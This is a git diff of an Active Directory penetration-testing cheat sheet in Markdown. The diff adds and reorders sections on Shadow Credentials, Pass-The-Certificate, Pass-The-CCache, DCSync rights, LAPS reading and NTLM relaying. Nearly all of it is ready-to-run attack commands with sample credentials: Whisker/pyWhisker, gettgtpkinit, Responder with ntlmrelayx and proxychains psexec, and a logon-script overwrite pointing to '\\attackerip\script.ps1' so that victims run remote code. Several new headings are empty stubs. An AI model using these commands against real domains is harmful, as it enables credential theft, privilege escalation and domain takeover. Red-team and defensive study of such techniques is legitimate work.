@@ -27,6 +27,9 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Targeted Kerberoast](#targeted-kerberoast)
 	* [Add DCsync privilege to object](#add-dcsync-to-object)
 	* [Add Users to Group](#add-users-to-group)
+	* [Overwrite Logon Script](#overwrite-logon-script)
+	* [Read LAPS](#read-laps)
+	* [Shadow Credentials](#shadow-credentials)
 * **[Weak GPO Permission](#weak-gpo-permission)**
 	* [Enumerate weak GPO Permission](#enumerate-weak-gpo-permission)
 	* [GPO Abuse with PowerView](#gpo-abuse-with-powerview)
@@ -43,11 +46,20 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Trust Account](#trust-account)
 * **[Lateral Movement / Post Exploitation](#lateral-movement--post-exploitation)**
 	* [Overpass-The-Hash](#overpass-the-hash-opth)
+	* [Pass-The-Certificate](#pass-the-certificate)
+	* [Pass-The-CCache](#pass-the-ccache)
 	* [Request TGT](#request-tgt)
 	* [runas](#runas)
-	* [NTLM Relay](#ntlm-relay)
 	* [Credential Harvesing](#credential-harvesting)
 		* [DCSync](#dcsync)
+* **[NTLM Relay](#relay)**
+	* [Basic Relaying](#basic-relaying)
+	* [Dump Domain Objects](#dump-domain-objects)
+	* [Store SOCKS Sessions](#store-socks-sessions)
+	* [Request User Certificate](#request-user-certificate)
+	* [ESC8](#esc8)
+	* [Webdav to RBCD/Shadow Creds](#webdav-to-rbcd/shadow-creds)
+	* [NetNTLMv1 to LDAP](#netntlmv1-to-ldap)
 * **[Persistence](#persistence)**
 	* [Golden Ticket](#golden-ticket)
 	* [Diamond Ticket](#diamond-ticket)
@@ -87,6 +99,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [ESC4](#esc4)
 	* [ESC8](#esc8)
 	* [Certifried](#certifried)
+	* [ADCS References](#adcs-references)
 * **[Relay Notes](#relay-notes)**
 * **[File Transfer](#file-transfer)**
 * **[DLL Sideloading](#dll-sideloading)**
@@ -332,16 +345,6 @@ $cred = New-Object System.Management.Automation.PSCredential($username,$password
 Set-DomainUserPassword -Identity studentadmin -Domain contoso.local -AccountPassword (ConvertTo-SecureString -AsPlainText -Force 'password123!') -Credential $cred
 ```
 
-### Add Users to Group
-This command will add specific principal to a group that exists in the domain. _Note that there are several tools to perform this. Below are some of the methods that can be used. Checkout this cool tool [bloodyAD](https://github.com/CravateRouge/bloodyAD)_
-```
-# PowerView
-Add-DomainGroupMember -Identity cadmins -Members lowpriv
-
-# net.exe
-net.exe group 'cadmins' lowpriv /add /domain
-```
-
 ### Targeted Kerberoast
 This technique will update `ServicePrincipalName` of a user object. Make sure to have a write permission on the user's attributes.
 ```
@@ -358,22 +361,47 @@ There is also a repo [targetedKerberoast](https://github.com/ShutdownRepo/target
 python3 targetedKerberoast.py -u jsparrow -p Password123 -d range.net --dc-ip 10.10.10.10
 ```
 
+### Add DCSync Privilege to object
+```
+Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity studentuser -Rights DCSync
+```
+
+### Add Users to Group
+This command will add specific principal to a group that exists in the domain. _Note that there are several tools to perform this. Below are some of the methods that can be used. Checkout this cool tool [bloodyAD](https://github.com/CravateRouge/bloodyAD)_
+```
+# PowerView
+Add-DomainGroupMember -Identity cadmins -Members lowpriv
+
+# net.exe
+net.exe group 'cadmins' lowpriv /add /domain
+```
+
 ### Overwrite Logon Script
 Logon Script will run everytime user logged in._(note: use ad module)_
 ```
 Set-ADObject -SamAccountName  -PropertyName scriptpath -PropertyValue "\\attackerip\script.ps1"
 ```
 
-### Add DCSync Privilege to object
-```
-Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity studentuser -Rights DCSync
-```
-
-### Read LAPS Local Administrator Password
+### Read LAPS
 This will only possible if you have _AllExtendedRights_ permission on a computer object.
 ```
 Get-DomainComputer -Properties ms-mcs-admpwd
 ```
+
+### Shadow Credentials
+There is an attribute called `msDS_KeyCredentialLink` where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has a matching private key, and a TGT will be sent if there is a match. The attribute could be controlled if the controlled account has a privilege to write on the account attributes. 
+```
+# Whisker
+Whisker.exe add /target:lowpriv /domain:range.net /dc:192.168.86.182 /path:cert.pfx /password:"pfx-password"
+
+# pyWhisker (list certificates)
+py pywhisker.py -d "range.net" -u "rangeadm" -p "Password123" -t "lowpriv" --action list
+
+# pyWhisker (modify msDS-KeyCredentialLink)
+py pywhisker.py -d "range.net" -u "rangeadm" -p "Password123" -t "lowpriv" --action add
+```
+
+Once you have obtained the certificate, it can further use the Pass-The-Certificate attack to authenticate. 
 
 # Weak GPO Permission
 ### Enumerate weak GPO Permission
@@ -534,6 +562,27 @@ mimikatz# sekurlsa::pth /user:administrator /ntlm:<ntlm hash> /domain:CONTOSO /r
 mimikatz# sekurlsa::pth /user:administrator /aes256:<aes256 key> /domain:CONTOSO /run:powershell.exe
 ```
 
+### Pass-The-Certificate
+A certificate must be obtain in order to perform this technique either through [Shadow Credentials](#shadow-credentials) or [ESC8](#esc8)
+```
+# PKINITTools
+python3 gettgtpkinit.py range.net/dc01\$ -pfx-base64 $(cat /tmp/b64-cert.b64) -dc-ip 192.168.86.182 /tmp/out.ccache
+```
+
+### Pass-The-CCache
+1. Request a TGT from KDC. _Note that this can be done with multiple ways, this is just one of the methods_
+```
+getTGT.py range.net/rangeadm:Password123 -dc-ip 192.168.86.182
+```
+2. export ccache file path to `KRB5CCNAME` environment variable.
+```
+export KRB5CCNAME=rangeadm.ccache
+```
+3. Authenticate with the target object. 
+```
+smbclient.py range.net/rangeadm@dc01.range.net -k -no-pass
+```
+
 ### Request TGT
 _Note: This will be log by the KDC_
 ```
@@ -554,32 +603,6 @@ This method will spawn a new process as the user. This wont validate your passwo
 runas /user:contoso\administrator /netonly powershell
 ```
 
-### NTLM Relay
-_Note: This attack will only work if SMB signing if disabled. This can be verify with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or any similar tools_
-
-1. Disable **SMB** and **HTTP** in `/etc/Responder.conf`
-2. Fire up responder. **SMB** and **HTTP** protocol now should now show as [OFF]
-	```
-	Responder.py -I eth0 -rdvw
-	```
-3. Create a targets.txt file containing targeted ip addresses. `ntlmrelayx.py` will run captured hash to every protocol available on the given ip addresses
-	```
-	all://192.168.0.10
-	all://192.168.0.11
-	```
-4. Run `ntlmrelayx.py`
-	```
-	ntlmrelayx.py -tf targets.txt -smb2support -socks
-	```
-5. Authenticate with any available Impacket scripts through `proxychains` and supply no password
-	```
-	# PsExec
-	proxychains Psexec.py contoso/administrator:''@192.168.0.10
-
-	# mssqlclient
-	proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
-	```
-
 ### Credential Harvesting
 ### DCSync
 ```
@@ -593,6 +616,72 @@ mimikatz# lsadump::dcsync /domain:fqdn /user:krbtgt
 lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc01$ /authdomain:contoso.local /authpassword:"" /authntlm
 ```
 
+# NTLM Relay
+_Note: This attack will only work if SMB signing if disabled. This can be verify with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or any similar tools_
+
+### Basic Relaying
+1. Disable **SMB** and **HTTP** in `/etc/Responder.conf`
+2. Fire up responder. **SMB** and **HTTP** protocol now should now show as [OFF]
+```
+Responder.py -I eth0 -rdvw
+```
+3. Create a targets.txt file containing targeted ip addresses. `ntlmrelayx.py` will run captured hash to every protocol available on the given ip addresses
+```
+all://192.168.0.10
+all://192.168.0.11
+```
+4. Run `ntlmrelayx.py`
+```
+ntlmrelayx.py -tf targets.txt -smb2support -socks
+```
+5. Authenticate with any available Impacket scripts through `proxychains` and supply no password
+```
+# PsExec
+proxychains Psexec.py contoso/administrator:''@192.168.0.10
+
+# mssqlclient
+proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
+```
+
+### Dump Domain Objects
+lookupsid.py
+
+### Store SOCKS Sessions
+```
+```
+
+### Request User Certificate
+```
+
+```
+
+### ESC8
+```
+```
+
+### Webdav to RBCD/Shadow Creds
+```
+```
+
+### NetNTLMv1 to LDAP
+```
+```
+
+### Relay Notes
+![Relay Roadmap](./src/relay_list.png)
+* [KrbRelayUP](https://twitter.com/an0n_r0/status/1519344255143141376?s=20&t=nk-MeM42nRevaMPNOvQDoA)
+* [RPC2RBCD](https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb)
+* [lookupsid](https://twitter.com/an0n_r0/status/1506824658838040580?s=20&t=HJ9qD6GkzCvg1p24XZ6A2Q)
+* [Kerberos Relay over DNS](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
+* [Flangvik's VOD RPC2RBCD](https://www.youtube.com/watch?v=axPkf_kLpMA)
+* [NTLMv1 Downgrade](https://twitter.com/theluemmel/status/1454774400553787394?s=20&t=V55BIRuHPzUSLDOEdVCfEg)
+* [NTLMv1 Downgrade Requirements](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ntlm/ntlmv1-downgrade)
+* https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay
+* https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
+* [All Relay attacks covered by @vendetce (pdf)](https://www.blackhillsinfosec.com/wp-content/uploads/2022/09/Coercions-and-Relays-The-First-Cred-is-the-Deepest.pdf)
+* [All Relay attacks covered by @vendetce (youtube)](https://www.youtube.com/watch?v=b0lLxLJKaRs)
+* https://www.youtube.com/watch?v=b0lLxLJKaRs
+* https://www.blackhillsinfosec.com/wp-content/uploads/2022/09/Coercions-and-Relays-The-First-Cred-is-the-Deepest.pdf
 # Persistence
 
 ### Golden Ticket
@@ -1163,7 +1252,7 @@ python3 PetitPotam.py -u 'peter' -p 'Welcome1234' -d 'range.net' 192.168.86.165 
 ```
 3. A base64 encoded ticket should be retrieved by now and save it in a file. Use gettgtpkinit.py to convert the pfx certificate to ccache format 
 ```
-python3 /opt/AD/PKINITtools/gettgtpkinit.py range.net/dc01\$ -pfx-base64 $(cat /tmp/b64-cert.b64) -dc-ip 192.168.86.182 /tmp/out.ccache
+python3 gettgtpkinit.py range.net/dc01\$ -pfx-base64 $(cat /tmp/b64-cert.b64) -dc-ip 192.168.86.182 /tmp/out.ccache
 ```
 4. Use getnthash.py to retrieve ntlm hash
 ```
@@ -1225,20 +1314,6 @@ For the details explanation of the vulnerability (CVE-2022-26923), you may read 
 ### ADCS References
 * https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/
 * https://www.thehacker.recipes/ad/movement/ad-cs/
-
-## Relay Notes
-![Relay Roadmap](./src/relay_list.png)
-* [KrbRelayUP](https://twitter.com/an0n_r0/status/1519344255143141376?s=20&t=nk-MeM42nRevaMPNOvQDoA)
-* [RPC2RBCD](https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb)
-* [lookupsid](https://twitter.com/an0n_r0/status/1506824658838040580?s=20&t=HJ9qD6GkzCvg1p24XZ6A2Q)
-* [Kerberos Relay over DNS](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
-* [Flangvik's VOD RPC2RBCD](https://www.youtube.com/watch?v=axPkf_kLpMA)
-* [NTLMv1 Downgrade](https://twitter.com/theluemmel/status/1454774400553787394?s=20&t=V55BIRuHPzUSLDOEdVCfEg)
-* [NTLMv1 Downgrade Requirements](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ntlm/ntlmv1-downgrade)
-* https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay
-* https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
-* [All Relay attacks covered by @vendetce (pdf)](https://www.blackhillsinfosec.com/wp-content/uploads/2022/09/Coercions-and-Relays-The-First-Cred-is-the-Deepest.pdf)
-* [All Relay attacks covered by @vendetce (youtube)](https://www.youtube.com/watch?v=b0lLxLJKaRs)
 
 # File Transfer
 
